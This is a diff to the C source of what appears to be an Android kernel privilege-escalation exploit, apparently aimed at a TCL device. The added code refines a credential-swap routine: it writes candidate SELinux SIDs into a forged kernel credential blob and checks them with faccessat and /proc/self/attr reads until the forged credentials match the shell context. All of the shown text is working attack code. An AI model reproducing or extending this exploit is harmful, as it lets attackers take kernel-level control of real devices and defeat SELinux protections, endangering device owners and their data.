@@ -2775,6 +2775,63 @@ static int run_cred_swap(void) {
         if (!found_sid && !g_selinux_off && !g_leaked_security_ptr &&
             hit_page) {
           char cb[128];
+          /* Candidate-first probe.  SID 1 maps to the kernel domain on the
+           * TCL policy.  Although selinux_getprocattr itself can return the
+           * current context without an AVC check, opening
+           * /proc/self/attr/current still performs ordinary procfs path
+           * traversal first.  kernel:s0 cannot search the shell-labelled
+           * process directory, so using sid_read_ctx() as the initial
+           * liveness oracle returns -EACCES for a perfectly live blob and
+           * used to skip every candidate.
+           *
+           * Write only the bounded, preselected candidates first.  A
+           * candidate must both access the relay child's pre-created
+           * shell_data_file and then read back the exact original shell
+           * context.  A false-positive access therefore cannot be accepted
+           * as the shell SID.  Restore SID 1 before the legacy liveness/scan
+           * path when none verifies. */
+          uint32_t early_cands[3];
+          int nearly = 0;
+          if (cached_sid) early_cands[nearly++] = cached_sid;
+          if (sid_env_override > 0)
+            early_cands[nearly++] = (uint32_t)sid_env_override;
+          if (sid_default > 0)
+            early_cands[nearly++] = (uint32_t)sid_default;
+          for (int ci = 0; ci < nearly && !found_sid; ci++) {
+            uint32_t c = early_cands[ci];
+            int dup = 0;
+            for (int cj = 0; cj < ci; cj++)
+              if (early_cands[cj] == c) dup = 1;
+            if (dup) continue;
+            blob_set_sid(hit_page, c);
+            errno = 0;
+            long ar = syscall(__NR_faccessat, AT_FDCWD,
+                              GL_SID_PROBE_PATH, R_OK, 0);
+            int ae = errno;
+            long vn = -1;
+            if (ar == 0) vn = sid_read_ctx(cb, sizeof(cb));
+            if (ar == 0 && vn > 0 &&
+                sid_ctx_is_shell(cb, vn, child_ctx)) {
+              found_sid = (int)c;
+              sid_how = (cached_sid && c == cached_sid) ? "cache-first"
+                      : (sid_env_override > 0 &&
+                         c == (uint32_t)sid_env_override)
+                        ? "env-first" : "default-first";
+              RELAY_STR("sid: EARLY CANDIDATE "); RELAY_DEC(c);
+              RELAY_STR(" VERIFIED probe=0 ctx="); RELAY_STR(cb);
+              RELAY_STR("\n");
+            } else {
+              RELAY_STR("sid: early candidate "); RELAY_DEC(c);
+              RELAY_STR(" rejected (probe="); RELAY_DEC(ar);
+              RELAY_STR(" errno="); RELAY_DEC(ae);
+              RELAY_STR(" ctx_n="); RELAY_DEC(vn);
+              if (vn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
+              RELAY_STR(")\n");
+            }
+          }
+          if (!found_sid) blob_set_sid(hit_page, 1);
+
+          if (!found_sid) {
           /* Liveness probe: fill_fake_cred_suite initialized blob->sid=1
            * (kernel), so a live blob reads back u:r:kernel:s0 with no
            * writes from us. A mismatch means our page is not the blob
@@ -2896,6 +2953,7 @@ static int run_cred_swap(void) {
                 }
               }
             }
+          }
           }
         }
 
